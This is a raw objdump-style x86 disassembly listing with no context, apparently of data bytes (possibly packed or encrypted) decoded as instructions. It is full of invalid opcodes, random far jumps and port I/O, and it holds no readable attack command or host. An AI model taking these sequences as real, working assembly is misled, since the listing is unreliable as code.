  4134dc:	loop   0x413530
  4134de:	out    0xd9,al
  4134e0:	adc    BYTE PTR [ebx+0x4f],cl
  4134e3:	add    bh,BYTE PTR ds:0xe2b60a7f
  4134e9:	stos   BYTE PTR es:[edi],al
  4134ea:	jnp    0x413569
  4134ec:	outs   dx,BYTE PTR ds:[esi]
  4134ed:	mov    eax,0x566c4ca6
  4134f2:	push   eax
  4134f4:	jnp    0x4134ff
  4134f6:	jo     0x41350a
  4134f8:	sbb    al,0x66
  4134fa:	iret   
  4134fb:	xor    eax,0x6857e87a
  413500:	test   BYTE PTR [ebp-0x39571b65],cl
  413506:	test   eax,0x2e6f62b8
  41350b:	imul   ebp,DWORD PTR [edi],0x82bcf5e0
  413511:	pop    ss
  413512:	loope  0x413526
  413514:	mov    ebp,0xec597486
  413519:	push   eax
  41351a:	(bad)  
  41351b:	mov    WORD PTR [esi+0x462303ea],es
  413521:	mov    WORD PTR [ecx],ds
  413523:	(bad)  
  413524:	out    0x4d,al
  413526:	inc    ebx
  413527:	stos   DWORD PTR es:[edi],eax
  413528:	xor    BYTE PTR [edx],cl
  41352a:	inc    esi
  41352b:	pop    ebp
  41352c:	adc    al,0x9e
  41352f:	mov    ds:0xfe2f6b04,al
  413534:	push   eax
  413535:	into   
  413536:	and    dh,0x28
  413539:	or     DWORD PTR [esi],0xe671b928
  41353f:	mov    al,0x77
  413541:	push   ebp
  413542:	mov    edi,DWORD PTR [edx]
  413544:	pushf  
  413545:	lods   eax,DWORD PTR ds:[esi]
  413546:	mov    dl,0xf7
  413548:	cmp    al,0x91
  41354a:	sub    cl,ch
  41354c:	mov    eax,0x91eb8ef7
  413551:	adc    eax,0x45228bd5
  413556:	inc    edi
  413557:	push   0x42
  413559:	or     BYTE PTR [ecx+esi*8],al
  41355c:	sub    eax,0xc869a142
  413561:	adc    cl,al
  413563:	icebp  
  413564:	ret    
  413565:	dec    WORD PTR [edi-0x40]
  413569:	in     al,dx
  41356a:	xor    DWORD PTR [ecx+0x6e],0x3d41737b
  413571:	xlat   BYTE PTR ds:[ebx]
  413572:	pop    edi
  413573:	xchg   ebp,eax
  413574:	pop    ebp
  413575:	popa   
  413576:	push   0x26
  413578:	pmullw mm3,QWORD PTR [eax]
  41357b:	mov    ds:0x5447f758,eax
  413580:	aaa    
  413581:	in     al,dx
  413582:	or     esi,DWORD PTR [edi+edx*2]
  413585:	push   ebp
  413586:	and    ecx,ecx
  413588:	leave  
  413589:	out    dx,al
  41358a:	scas   al,BYTE PTR es:[edi]
  41358b:	scas   al,BYTE PTR es:[edi]
  41358c:	out    0x4,al
  41358e:	mov    dh,BYTE PTR [ecx]
  413590:	cmp    DWORD PTR fs:[ebx],edx
  413593:	sbb    edx,esi
  413595:	rol    BYTE PTR [edx+0x39cf765d],cl
  41359b:	(bad)  
  41359c:	cmp    DWORD PTR [eax+0x3b],ecx
  41359f:	cmc    
  4135a0:	mov    ah,BYTE PTR [ebx+0x70]
  4135a3:	int    0x7e
  4135a5:	fld    TBYTE PTR [ecx+0x30]
  4135a8:	jne    0x413618
  4135aa:	add    al,0xcb
  4135ac:	or     al,BYTE PTR [edx*4+0x5a2cbe84]
  4135b3:	jg     0x41354c
  4135b5:	sbb    ah,BYTE PTR [eax+0xa]
  4135b8:	pushf  
  4135b9:	inc    eax
  4135ba:	test   DWORD PTR [esi],0x17d644bd
  4135c0:	je     0x41359b
  4135c2:	imul   BYTE PTR [ecx+edi*4]
  4135c5:	fnstenv [edx-0x4f416a01]
  4135cb:	mov    al,ds:0x10e291e5
  4135d0:	cmc    
  4135d1:	push   ebx
  4135d2:	cdq    
  4135d3:	fst    DWORD PTR [edi-0x68]
  4135d6:	jbe    0x4135a5
  4135d8:	(bad)  
  4135d9:	and    eax,0x14703a08
  4135de:	lods   eax,DWORD PTR es:[esi]
  4135e0:	(bad)  
  4135e1:	stc    
  4135e2:	inc    edx
  4135e3:	xchg   ebx,eax
  4135e4:	mov    esi,0x68480474
  4135e9:	sbb    BYTE PTR [eax-0x1845cdc],dl
  4135ef:	fnstenv [eax+0x7b]
  4135f2:	jg     0x4135e7
  4135f4:	dec    ecx
  4135f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135f6:	outs   dx,DWORD PTR ds:[esi]
  4135f7:	adc    eax,esp
  4135f9:	lods   eax,DWORD PTR ds:[esi]
  4135fa:	and    ebp,DWORD PTR [ebx]
  4135fc:	jb     0x413596
  4135fe:	sbb    DWORD PTR [esi-0x50],ebp
  413601:	jle    0x41362e
  413603:	arpl   WORD PTR [eax-0x34],di
  413606:	fild   DWORD PTR [ebx]
  413608:	mov    ecx,0x3d31aaa4
  41360d:	arpl   cx,dx
  41360f:	and    ecx,edi
  413611:	clc    
  413612:	and    al,0x26
  413614:	ins    DWORD PTR es:[edi],dx
  413615:	dec    eax
  413616:	mov    ecx,0x98ea1ebe
  41361b:	inc    ebp
  41361c:	idiv   eax
  41361e:	mov    al,ds:0xf612d20a
  413623:	sti    
  413624:	cmp    ebp,DWORD PTR [esi+0x3e]
  413627:	xchg   esi,eax
  413628:	loope  0x413697
  41362a:	sub    BYTE PTR [esi-0x52],al
  41362d:	scas   eax,DWORD PTR es:[edi]
  41362e:	bound  edx,QWORD PTR [eax]
  413630:	data16 icebp 
  413632:	xchg   ecx,eax
  413633:	sub    BYTE PTR [edi],dh
  413635:	not    BYTE PTR [ebx+esi*4-0x1a]
  413639:	jb     0x41363a
  41363b:	mov    al,ds:0x8d245b03
  413640:	fdiv   DWORD PTR [eax-0x624893ce]
  413646:	pop    ds
  413647:	and    ecx,esp
  413649:	mov    fs,ebx
  41364b:	jnp    0x413610
  41364d:	das    
  41364e:	enter  0x802a,0x14
  413652:	cli    
  413653:	add    BYTE PTR [ebx+0x5d],cl
  413656:	cwde   
  413657:	fmul   QWORD PTR [ecx-0x59967816]
  41365d:	push   eax
  41365e:	lock scas al,BYTE PTR es:[edi]
  413660:	dec    ebp
  413661:	ss mov esp,0x272f0435
  413667:	xchg   ebp,eax
  413668:	shr    BYTE PTR [edi*2-0x3ab49b7c],1
  41366f:	adc    al,0xc1
  413671:	fnsave ds:0xa8f692d3
  413677:	into   
  413678:	and    BYTE PTR [esi+0x4c],dl
  41367b:	jp     0x4136ba
  41367d:	push   ds
  41367e:	jp     0x41366e
  413680:	popa   
  413681:	jle    0x4136b0
  413683:	mov    ah,0x77
  413685:	lods   al,BYTE PTR ds:[esi]
  413686:	idiv   DWORD PTR [edx+esi*2-0x30]
  41368a:	js     0x4136c7
  41368c:	cmp    bh,BYTE PTR [ecx+0xe96cc76]
  413692:	and    DWORD PTR [ecx],ebx
  413694:	xchg   edi,eax
  413695:	adc    al,0x8c
  413697:	dec    ecx
  413698:	adc    al,0x51
  41369a:	and    DWORD PTR [ebx-0x16],ecx
  41369d:	sbb    al,BYTE PTR [ebx-0x43b361e3]
  4136a3:	inc    ecx
  4136a4:	popa   
  4136a5:	inc    ebp
  4136a6:	into   
  4136a7:	sub    eax,0xe0034410
  4136ac:	popa   
  4136ad:	jbe    0x4136c3
  4136af:	mov    eax,0xc709224e
  4136b4:	fld    DWORD PTR [ebp+ecx*2+0x214b3585]
  4136bb:	(bad)  
  4136bd:	ins    DWORD PTR es:[edi],dx
  4136be:	es push edi
  4136c0:	ins    BYTE PTR es:[edi],dx
  4136c1:	mov    bl,0x6e
  4136c3:	in     eax,dx
  4136c4:	pushf  
  4136c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c6:	jp     0x413710
  4136c8:	inc    esi
  4136c9:	outs   dx,DWORD PTR ds:[esi]
  4136ca:	push   esp
  4136cb:	imul   ebx,DWORD PTR [ebp+0x76],0x6b
  4136cf:	dec    eax
  4136d0:	fdiv   QWORD PTR [ebp+ecx*8+0x47046e8a]
  4136d7:	(bad)  
  4136d8:	out    dx,al
  4136d9:	xchg   DWORD PTR [ebx+0x2b],esi
  4136dc:	or     ah,BYTE PTR [edx+0x6d]
  4136df:	js     0x4136f6
  4136e1:	(bad)  
  4136e2:	and    DWORD PTR [eax],ebx
  4136e4:	inc    edi
  4136e5:	hlt    
  4136e6:	pop    ecx
  4136e7:	xor    cl,al
  4136e9:	shl    esi,0x7a
  4136ec:	gs das 
  4136ee:	inc    eax
  4136ef:	add    edi,ecx
  4136f1:	xchg   edx,eax
  4136f2:	xor    esp,DWORD PTR [esi-0xa]
  4136f5:	mov    edx,0xafaac215
  4136fa:	and    al,0x81
  4136fc:	fiadd  DWORD PTR [edi+0x46]
  4136ff:	and    ebx,edi
  413701:	bound  ebp,QWORD PTR [eax]
  413703:	push   eax
  413704:	xor    eax,0xc527fac2
  413709:	lock jns 0x413745
  41370c:	xchg   edi,eax
  41370d:	mov    bl,BYTE PTR [esi]
  41370f:	loop   0x413732
  413711:	ror    BYTE PTR [edx],cl
  413713:	xor    bl,ch
  413715:	sbb    eax,0x74e36668
  41371a:	rcr    eax,1
  41371c:	mov    esi,0x46b44c98
  413721:	jae    0x41370f
  413723:	ja     0x4136eb
  413725:	mov    al,0x75
  413727:	adc    eax,0xec81ded6
  41372c:	loop   0x413781
  41372e:	into   
  41372f:	mov    bl,ch
  413731:	ficomp DWORD PTR [ebp+edi*4-0x231ada02]
  413738:	in     al,0xd5
  41373a:	push   cs
  41373b:	inc    edx
  41373c:	jge    0x4136ce
  41373e:	mov    cl,0xe5
  413740:	hlt    
  413741:	and    al,0xf2
  413743:	stos   BYTE PTR es:[edi],al
  413744:	mov    ebx,0x9f71d4f2
  413749:	sub    DWORD PTR [ebp-0x4599315c],ecx
  41374f:	jl     0x413789
  413751:	mov    cl,0xd3
  413753:	fld    DWORD PTR [ecx+0x11b418cd]
  413759:	(bad)  
  41375a:	rcl    DWORD PTR [esi-0x2c],1
  41375d:	mov    ah,0x2a
  41375f:	inc    esi
  413760:	jo     0x41370d
  413762:	cld    
  413763:	call   0xe37:0x5e05740b
  41376a:	mov    DWORD PTR [edx-0x6e],0x814b729f
  413771:	(bad)  
  413772:	xchg   esi,eax
  413773:	gs test eax,0x90869419
  413779:	(bad)  
  41377a:	std    
  41377b:	xor    BYTE PTR [edi-0x72],al
  41377e:	fcomip st,st(4)
  413780:	in     eax,0xa5
  413782:	sbb    ebx,DWORD PTR [edi]
  413784:	repz sub al,0x58
  413787:	mov    BYTE PTR [ecx+esi*4+0x2cf6ca2f],ah
  41378e:	jb     0x413731
  413790:	xchg   ebx,eax
  413791:	xor    al,0x3b
  413793:	je     0x413738
  413795:	mov    ecx,0x203c17f
  41379a:	call   DWORD PTR [ebx+0x7d]
  41379d:	jns    0x4137d0
  41379f:	scas   al,BYTE PTR es:[edi]
  4137a0:	rcl    eax,1
  4137a2:	scas   eax,DWORD PTR es:[edi]
  4137a3:	lods   al,BYTE PTR es:[esi]
  4137a5:	sub    eax,0x63565512
  4137aa:	call   0xc2815d9d
  4137af:	shl    DWORD PTR [edx+0xc],0xe7
  4137b3:	and    eax,0x7bead7f9
  4137b8:	pop    es
  4137b9:	sbb    al,0x57
  4137bb:	mov    esi,0xb0afd25
  4137c0:	mov    ds:0x6d1321e3,eax
  4137c5:	xchg   edi,eax
  4137c6:	xchg   ebp,eax
  4137c7:	add    eax,0x9c73a533
  4137cc:	adc    esp,edi
  4137ce:	aam    0xf9
  4137d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d1:	fcomp  QWORD PTR [ecx-0x55945f49]
  4137d7:	and    BYTE PTR [edi+ebp*2-0x24],cl
  4137db:	dec    ebp
  4137dc:	add    eax,0x80423618
  4137e1:	push   edi
  4137e3:	arpl   WORD PTR [edx-0x4e399519],di
  4137e9:	retf   
  4137ea:	push   cs
  4137eb:	aam    0x3e
  4137ed:	cld    
  4137ee:	and    edx,ebx
  4137f0:	ret    
  4137f1:	ror    BYTE PTR [ebp-0x86ed6b],0xa4
  4137f8:	xor    esi,DWORD PTR [ecx+0x34134a3d]
  4137fe:	mov    ch,0xf
  413800:	cs cmc 
  413802:	mov    ecx,edi
  413804:	sar    DWORD PTR [edi-0x6573cd9],1
  41380a:	sahf   
  41380b:	int    0x81
  41380d:	xor    esp,DWORD PTR [ebx]
  41380f:	xchg   esi,eax
  413810:	jl     0x4137bc
  413812:	mov    WORD PTR [edx],gs
  413814:	mov    BYTE PTR [ebp+0x6fd4f79d],cl
  41381a:	out    dx,al
  41381b:	jo     0x41388f
  41381d:	arpl   WORD PTR [esi-0x44],cx
  413820:	aaa    
  413821:	int3   
  413822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413823:	cmp    ch,BYTE PTR ds:0xb02b82c9
  413829:	pop    ds
  41382a:	fild   DWORD PTR fs:[edi]
  41382d:	and    al,0xc2
  41382f:	inc    edi
  413830:	repnz fdiv st(4),st
  413833:	in     al,0x2a
  413835:	stos   DWORD PTR es:[edi],eax
  413836:	mov    BYTE PTR [esi],0xb0
  413839:	inc    eax
  41383a:	daa    
  41383b:	shr    BYTE PTR [edx-0x40a788ff],0x3c
  413842:	xor    DWORD PTR [edi+0x16da5d12],0xefd12795
  41384c:	mov    cs,WORD PTR [ebx]
  41384e:	cmp    esp,esp
  413850:	mov    eax,ds:0x20113069
  413855:	mov    edx,0x45b43ac4
  41385a:	pop    ebp
  41385b:	rol    al,cl
  41385d:	out    dx,eax
  41385e:	mov    ebp,0xa8a95e56
  413863:	push   ss
  413864:	rcr    BYTE PTR ds:[edx],0xf9
  413868:	stos   DWORD PTR es:[edi],eax
  413869:	mov    dl,0x3a
  41386b:	int3   
  41386c:	inc    esp
  41386d:	mov    ch,0x47
  41386f:	dec    DWORD PTR ss:[esi+0x2f]
  413873:	stos   BYTE PTR es:[edi],al
  413874:	ret    
  413875:	sti    
  413876:	out    dx,al
  413877:	xchg   BYTE PTR [edi-0x76a329e6],al
  41387d:	scas   eax,DWORD PTR es:[edi]
  41387e:	sar    DWORD PTR [esi],cl
  413880:	hlt    
  413881:	cmp    al,0x44
  413883:	enter  0xb17c,0x60
  413887:	test   al,0xb5
  413889:	add    bh,BYTE PTR [edx]
  41388b:	clc    
  41388c:	arpl   di,si
  41388e:	sub    ah,cl
  413890:	mov    es,WORD PTR [edi+0x54a53aed]
  413896:	cmp    eax,0x205ad73e
  41389b:	popa   
  41389c:	xchg   dh,bh
  41389e:	icebp  
  41389f:	add    BYTE PTR [esi],ah
  4138a1:	sbb    eax,0x8c2e5c3c
  4138a6:	xchg   edi,eax
  4138a7:	out    0xd6,eax
  4138a9:	jmp    0x2c1035a8
  4138ae:	mov    ebp,0xb506cbdf
  4138b3:	fistp  DWORD PTR [eax-0x3df69817]
  4138b9:	and    eax,0xdb83f8f1
  4138be:	pushf  
  4138bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c0:	fisub  DWORD PTR [edx+0x1]
  4138c3:	int    0x6a
  4138c5:	and    ebx,DWORD PTR [edi+0x2d]
  4138c8:	mov    ah,BYTE PTR [ecx+0x52]
  4138cb:	pop    esp
  4138cc:	mov    ah,0x25
  4138ce:	xchg   esp,eax
  4138cf:	xchg   esp,eax
  4138d0:	bound  esi,QWORD PTR [ebx]
  4138d2:	mov    bl,0xe3
  4138d4:	mov    ds:0x6d51a284,eax
  4138d9:	in     al,dx
  4138da:	test   BYTE PTR [edi],bl
  4138dc:	mov    ebx,0x155426b7
  4138e1:	cwde   
  4138e2:	add    dh,BYTE PTR [edi]
  4138e4:	push   ebx
  4138e5:	aad    0xfc
  4138e7:	jnp    0x4138c9
  4138e9:	lock std 
  4138eb:	or     al,0x6
  4138ed:	pop    eax
  4138ee:	mov    al,ds:0x5af359ee
  4138f3:	out    dx,al
  4138f4:	(bad)  
  4138f5:	mov    cl,0x3a
  4138f7:	xchg   ebx,eax
  4138f8:	pop    ss
  4138f9:	pop    eax
  4138fa:	push   cs
  4138fb:	add    DWORD PTR [edi+0x4c],edx
  4138fe:	or     bh,BYTE PTR [edi-0x378c6f09]
  413904:	frstor [ebp+0x16a426b0]
  41390a:	fs cld 
  41390c:	pop    esi
  41390d:	int    0x9e
  41390f:	push   0x2a
  413911:	call   0x5ec9:0x2b44b89c
  413918:	xor    dh,BYTE PTR [ecx-0x39]
  41391b:	stos   DWORD PTR es:[edi],eax
  41391c:	push   0x26
  41391e:	mov    ah,0x12
  413920:	mov    ebx,DWORD PTR [esp+edx*1+0x4b]
  413924:	cmp    ch,BYTE PTR [ebp-0x4e95a600]
  41392a:	push   ebx
  41392b:	sbb    ch,cl
  41392d:	retf   
  41392e:	push   ebx
  41392f:	call   0xe2d:0x4aacc56
  413936:	inc    eax
  413937:	fdivr  DWORD PTR [ebx+0xffcb483]
  41393d:	aas    
  41393e:	test   BYTE PTR [ebx-0x11],cl
  413941:	xchg   BYTE PTR ds:0xaa0f591d,al
  413947:	add    BYTE PTR [ebp+0x54],bh
  41394a:	jne    0x413969
  41394c:	jae    0x4139a2
  41394e:	inc    ebp
  41394f:	dec    DWORD PTR [ecx-0x25]
  413952:	mov    dh,0x39
  413954:	bound  eax,QWORD PTR [ecx+0x67]
  413957:	imul   edi,DWORD PTR [eax-0x6376b925],0x9e7ec48
  413961:	cmp    al,0x3
  413963:	imul   esi,edx,0x20
  413966:	mov    dh,0xd6
  413968:	sbb    eax,0xc33b6b25
  41396d:	cmp    al,0x1b
  41396f:	sub    eax,0x9189ebbb
  413974:	dec    eax
  413975:	xchg   BYTE PTR ds:0xb656795,al
  41397b:	mov    eax,0xc3b28df9
  413980:	loop   0x4139c2
  413982:	popa   
  413983:	repnz add ebp,ebx
  413986:	pop    esp
  413987:	in     eax,0x37
  413989:	xchg   edi,eax
  41398a:	cmp    ecx,DWORD PTR [edx-0x4c]
  41398d:	inc    ecx
  41398e:	mov    ds:0xec1e0065,eax
  413993:	pusha  
  413994:	in     eax,0x25
  413996:	jmp    0x1a081a45
  41399b:	push   ecx
  41399c:	pop    esp
  41399d:	mov    esp,0xb5e7db33
  4139a2:	out    dx,eax
  4139a3:	jp     0x413994
  4139a5:	sub    al,0x58
  4139a7:	nop
  4139a8:	les    eax,FWORD PTR [eax-0x45bae5dd]
  4139ae:	out    0xed,al
  4139b0:	arpl   WORD PTR [edx+0x453c9214],bx
  4139b6:	mov    esp,0xe2d57b4c
  4139bb:	xchg   ecx,eax
  4139bc:	and    DWORD PTR [edi+0x90ed928],esp
  4139c2:	sub    BYTE PTR [edi-0xe],dh
  4139c5:	inc    ebp
  4139c6:	jge    0x4139c7
  4139c8:	repz arpl WORD PTR [esi-0x2e],di
  4139cc:	ret    
  4139cd:	jecxz  0x413a37
  4139cf:	cs pop ds
  4139d1:	stos   DWORD PTR es:[edi],eax
  4139d2:	add    bl,BYTE PTR [edi+ebx*1-0x68e3dcf9]
  4139d9:	out    dx,eax
  4139da:	push   es
  4139db:	iret   
  4139dc:	mul    ebp
  4139de:	mov    ebp,0x8f53f1bc
  4139e3:	dec    edx
  4139e4:	jg     0x413a43
  4139e6:	xor    al,0x28
  4139e8:	adc    al,0xd0
  4139ea:	mov    ch,0x50
  4139ec:	lods   eax,DWORD PTR ds:[esi]
  4139ed:	out    dx,al
  4139ee:	xlat   BYTE PTR ds:[ebx]
  4139ef:	fs pop esp
  4139f1:	adc    BYTE PTR ds:0xf7fb5e9b,bl
  4139f7:	jge    0x4139cd
  4139f9:	or     BYTE PTR [edi-0x764eac3f],ch
  4139ff:	xor    al,0x2c
  413a01:	fisubr WORD PTR [edx+0x59450079]
  413a07:	(bad)  
  413a09:	mov    eax,ds:0xb955b8be
  413a0e:	inc    ebx
  413a0f:	in     al,dx
  413a10:	and    edi,DWORD PTR [ebx-0x4e]
  413a13:	mov    ecx,eax
  413a15:	stc    
  413a16:	(bad)  
  413a18:	inc    eax
  413a19:	ins    BYTE PTR es:[edi],dx
  413a1a:	fist   WORD PTR [ebx+0x2d]
  413a1d:	fwait
  413a1e:	std    
  413a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a20:	dec    ebp
  413a21:	sar    BYTE PTR [esi-0x2d657470],0x7
  413a28:	mov    BYTE PTR [esi+0xa],bh
  413a2b:	or     BYTE PTR [edx-0x72f5eb06],al
  413a31:	mov    ebp,0x92a83c8a
  413a36:	fcmovnu st,st(2)
  413a38:	imul   ecx,ebx,0x69
  413a3b:	jmp    0x19df:0xda82afb1
  413a42:	mov    ecx,0xf9f8ff83
  413a47:	mov    esi,0x526669bc
  413a4c:	xchg   DWORD PTR [ebx-0x4b],ebp
  413a4f:	leave  
  413a50:	(bad)  
  413a51:	mov    ds:0xd7494a9c,al
  413a56:	fidivr DWORD PTR [esi-0x1a]
  413a59:	mov    ebp,0xb477d634
  413a5e:	outs   dx,DWORD PTR ds:[esi]
  413a5f:	and    eax,0x6c7d8289
  413a65:	mov    ch,0x4b
  413a67:	or     al,0x88
  413a69:	xor    bl,BYTE PTR [ecx+0x5c4ebff3]
  413a6f:	jg     0x413a71
  413a71:	xchg   DWORD PTR [eax-0x4],edx
  413a74:	test   eax,0x9bfc70f8
  413a79:	dec    ecx
  413a7a:	mov    ah,0x68
  413a7c:	ins    BYTE PTR es:[edi],dx
  413a7d:	mov    bl,0xfa
  413a7f:	sbb    DWORD PTR [ecx+0xc],0x710e6293
  413a86:	adc    dl,BYTE PTR [ebp-0x9]
  413a89:	mov    eax,0x286e9b4a
  413a8e:	in     eax,dx
  413a8f:	jno    0x413aeb
  413a91:	mov    ch,0x27
  413a93:	jl     0x413ade
  413a95:	jae    0x413aaa
  413a97:	cmp    bh,BYTE PTR [edi+esi*2+0x59]
  413a9b:	ss popfw 
  413a9e:	and    DWORD PTR [ecx-0x49],0x767e882
  413aa5:	push   ebx
  413aa6:	sub    DWORD PTR [ecx-0x526b72ad],0x65
  413aad:	mov    dl,0x68
  413aaf:	inc    esi
  413ab0:	add    DWORD PTR ds:0x490b9c1a,0x4d
  413ab7:	addr16 clc 
  413ab9:	jp     0x413a98
  413abb:	repnz sub BYTE PTR [ebx-0x5c0cadf5],dl
  413ac2:	xlat   BYTE PTR ds:[ebx]
  413ac3:	add    eax,0x919e7da7
  413ac8:	and    eax,0xab1b6540
  413acd:	sar    BYTE PTR [esi+0x78],cl
  413ad0:	mov    edx,0xd3c85a9
  413ad5:	xlat   BYTE PTR ds:[ebx]
  413ad6:	dec    esp
  413ad7:	out    0xd3,eax
  413ad9:	ret    
  413ada:	push   esi
  413adb:	fistp  QWORD PTR [esi]
  413add:	xlat   BYTE PTR ds:[ebx]
  413ade:	xor    eax,edi
  413ae0:	imul   ebx,edx,0xfffffffa
  413ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae4:	in     eax,0xeb
  413ae6:	xlat   BYTE PTR ds:[ebx]
  413ae7:	aaa    
  413ae8:	xchg   edi,eax
  413ae9:	das    
  413aea:	push   es
  413aeb:	jmp    0xc54db12
  413af0:	sbb    DWORD PTR [eax-0x2e],esi
  413af3:	jmp    0x83e9a753
  413af8:	and    eax,0x472c8d44
  413afd:	cmp    ah,BYTE PTR ds:[ecx+edx*2+0x5d263201]
  413b05:	leave  
  413b06:	ins    DWORD PTR es:[edi],dx
  413b07:	cs sub edi,ebx
  413b0a:	(bad)  
  413b0b:	shl    DWORD PTR [edi-0x36c98a56],1
  413b11:	js     0x413a98
  413b13:	jecxz  0x413b6f
  413b15:	sbb    ah,BYTE PTR [eax-0x6a]
  413b18:	xchg   ebp,eax
  413b19:	fsubr  DWORD PTR [ecx+0x25]
  413b1c:	in     al,0x3
  413b1e:	cmp    al,0x54
  413b20:	(bad)
  413b23:	ins    BYTE PTR es:[edi],dx
  413b24:	inc    esi
  413b25:	jg     0x413ac9
  413b27:	adc    eax,0xe2a56973
  413b2c:	nop
  413b2d:	xor    al,0x23
  413b2f:	xchg   BYTE PTR [edi],dl
  413b31:	dec    edx
  413b32:	out    0x2,eax
  413b34:	in     al,dx
  413b35:	loopne 0x413b08
  413b37:	inc    ebx
  413b38:	push   edx
  413b39:	mov    edi,0x4819b80c
  413b3e:	adc    dl,cl
  413b40:	jmp    0x413b36
  413b42:	cmp    BYTE PTR [ebp+0x37],al
  413b45:	xchg   esi,eax
  413b46:	enter  0xb2fd,0xdc
  413b4a:	xchg   ebx,eax
  413b4b:	dec    eax
  413b4c:	and    ecx,DWORD PTR [edi+ebp*2+0xf056bb1]
  413b53:	(bad)  
  413b54:	leave  
  413b55:	jmp    0x413bbd
  413b57:	rcr    al,cl
  413b59:	dec    ebp
  413b5a:	mov    edi,0xc897e0e
  413b5f:	push   ecx
  413b60:	sub    cl,BYTE PTR [ebx-0x303c6c2a]
  413b66:	or     ah,BYTE PTR [ebx+0x1]
  413b69:	es inc edi
  413b6b:	pop    es
  413b6c:	jne    0x413bcc
  413b6e:	jns    0x413afc
  413b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b71:	cmp    al,0x53
  413b73:	fwait
  413b74:	jbe    0x413b5d
  413b76:	lods   al,BYTE PTR ds:[esi]
  413b77:	mov    esp,0xac43d2e4
  413b7c:	pop    ecx
  413b7d:	mov    ebp,0x9eeebf95
  413b82:	nop
  413b83:	bound  ecx,QWORD PTR [ebp+0x14bcd3b5]
  413b89:	dec    ebp
  413b8a:	pop    edx
  413b8b:	mov    cl,0x5d
  413b8d:	cld    
  413b8e:	xor    eax,0xa767d354
  413b93:	push   ecx
  413b94:	mov    edi,0x523bf3b4
  413b99:	inc    edx
  413b9a:	sbb    DWORD PTR [edx+0x4dd0c690],edx
  413ba0:	pop    ecx
  413ba1:	adc    edx,0xffffffcb
  413ba4:	std    
  413ba5:	ins    BYTE PTR es:[edi],dx
  413ba6:	idiv   ebx
  413ba8:	mov    ch,0x3a
  413baa:	popf   
  413bab:	add    cl,dl
  413bad:	mov    esi,0x5aa47b23
  413bb2:	test   DWORD PTR [esp+edi*1-0x4d5f1d7b],0xa3a160a4
  413bbd:	mov    ebx,0xfd27d596
  413bc2:	mov    ah,0xda
  413bc4:	sar    DWORD PTR [edi+ebx*4],0x77
  413bc8:	faddp  st(0),st
  413bca:	das    
  413bcb:	xor    ecx,edx
  413bcd:	ss dec esi
  413bcf:	push   ecx
  413bd0:	pop    edi
  413bd1:	add    al,0xb5
  413bd3:	push   edx
  413bd4:	mov    bl,0xf6
  413bd6:	fsub   QWORD PTR [edx]
  413bd8:	xchg   esp,eax
  413bd9:	jo     0x413bdd
  413bdb:	inc    edx
  413bdc:	mov    ebx,ebp
  413bde:	cdq    
  413bdf:	test   ah,dh
  413be1:	leave  
  413be2:	imul   edi,DWORD PTR [edi-0x41975895],0x61
  413be9:	push   ebp
  413bea:	out    0x15,al
  413bec:	test   al,0x5b
  413bee:	mov    esp,0x77c61316
  413bf3:	jge    0x413c2b
  413bf5:	xchg   esi,eax
  413bf6:	dec    eax
  413bf7:	enter  0xe06e,0x53
  413bfb:	push   ebp
  413bfc:	je     0x413b92
  413bfe:	jno    0x413c6c
  413c00:	pusha  
  413c01:	repz sahf 
  413c03:	lods   eax,DWORD PTR ds:[esi]
  413c04:	add    DWORD PTR [esi-0x2d849707],esp
  413c0a:	dec    ecx
  413c0b:	imul   ebx,DWORD PTR [ebp-0xc],0x25
  413c0f:	pushf  
  413c10:	shl    BYTE PTR [ebp+ebx*4+0xf],cl
  413c14:	in     al,dx
  413c15:	inc    BYTE PTR [ebp-0x7420778a]
  413c1b:	pop    ebp
  413c1c:	jmp    0x413b9e
  413c1e:	out    0x8d,eax
  413c20:	and    DWORD PTR [ecx+0x69],ecx
  413c23:	stc    
  413c24:	sbb    ah,dh
  413c26:	or     eax,0xc564e9f2
  413c2b:	and    bh,BYTE PTR [edx]
  413c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c2e:	mov    esp,DWORD PTR [ebx-0xd8463a1]
  413c34:	mov    bh,0xb8
  413c36:	sbb    esp,ebx
  413c38:	inc    eax
  413c39:	mov    al,ds:0x6ee7396e
  413c3e:	scas   al,BYTE PTR es:[edi]
  413c3f:	cdq    
  413c40:	scas   eax,DWORD PTR es:[edi]
  413c41:	aad    0x94
  413c43:	push   ebp
  413c44:	imul   edi,ebx,0x27
  413c47:	xchg   ebp,eax
  413c48:	adc    al,0x47
  413c4a:	cmp    eax,0x759130f
  413c4f:	hlt    
  413c50:	inc    esp
  413c51:	mov    ah,0x99
  413c53:	push   esp
  413c54:	pop    esp
  413c55:	lods   al,BYTE PTR ds:[esi]
  413c56:	jae    0x413c41
  413c58:	mov    esi,0xfaec1884
  413c5d:	(bad)  
  413c5e:	mov    ah,0xfd
  413c60:	and    eax,0x59ef226c
  413c65:	dec    ebx
  413c66:	or     ebx,DWORD PTR [edi+0x56]
  413c69:	adc    BYTE PTR [edi],dh
  413c6b:	cmp    DWORD PTR [edx+eax*1],0xfffffff8
  413c6f:	add    ecx,DWORD PTR ds:0x7ecfe4f3
  413c75:	add    ebx,ecx
  413c77:	jmp    0x413ce4
  413c79:	aas    
  413c7a:	mov    ebx,DWORD PTR [edi]
  413c7c:	icebp  
  413c7d:	popf   
  413c7e:	xchg   edi,eax
  413c7f:	add    DWORD PTR ds:0x9202109b,0xf92598e8
  413c89:	fisttp DWORD PTR [ecx]
  413c8b:	shr    BYTE PTR [ebx-0xd9d472f],0x1a
  413c92:	test   DWORD PTR ds:[ebp+0x3d89395a],ebp
  413c99:	loope  0x413cfc
  413c9b:	push   cs
  413c9c:	ins    BYTE PTR es:[edi],dx
  413c9d:	mov    ebp,0x1aac2167
  413ca2:	repnz aaa 
  413ca4:	jbe    0x413c49
  413ca6:	je     0x413cff
  413ca8:	mov    ds:0xfcc1c321,al
  413cad:	sbb    DWORD PTR [esi+edx*8],esp
  413cb0:	mov    edi,0x32bb245e
  413cb5:	nop
  413cb6:	aaa    
  413cb7:	push   es
